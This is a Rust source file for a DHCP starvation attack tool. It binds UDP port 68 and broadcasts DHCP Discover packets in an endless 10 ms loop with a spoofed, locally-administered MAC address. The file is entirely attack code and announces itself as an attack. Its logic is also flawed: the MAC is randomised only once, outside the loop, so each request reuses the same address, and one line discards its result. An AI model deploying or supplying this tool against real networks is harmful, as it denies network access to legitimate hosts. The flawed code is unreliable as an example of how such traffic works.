use dhcproto::{Encodable, Encoder, v4};
use rand::Rng;
use std::net::UdpSocket;
use std::thread;
use std::time::Duration;

pub(crate) fn main() -> anyhow::Result<()> {
    let socket = UdpSocket::bind(("0.0.0.0", 68))?;
    socket.set_broadcast(true)?;

    println!("Starting DHCP starvation attack...");
    let mut rng = rand::rng();
    let mut mac = [0u8; 6];
    rng.fill(&mut mac);
    mac[0] |= 0x02;
    mac[0] &= 0xfe;
    mac.to_vec();
    loop {
        let change_address = mac.to_vec();

        let mut msg = v4::Message::default();
        msg.set_flags(v4::Flags::default().set_broadcast());
        msg.set_chaddr(&change_address);

        msg.opts_mut()
            .insert(v4::DhcpOption::MessageType(v4::MessageType::Discover));
        msg.opts_mut()
            .insert(v4::DhcpOption::ParameterRequestList(vec![
                v4::OptionCode::SubnetMask,
                v4::OptionCode::Router,
                v4::OptionCode::DomainNameServer,
                v4::OptionCode::DomainName,
            ]));
        msg.opts_mut()
            .insert(v4::DhcpOption::ClientIdentifier(change_address.clone()));

        let mut buf = Vec::new();
        let mut e = Encoder::new(&mut buf);
        msg.encode(&mut e)?;

        socket.send_to(&buf, ("255.255.255.255", 67))?;

        thread::sleep(Duration::from_millis(10));
    }
}
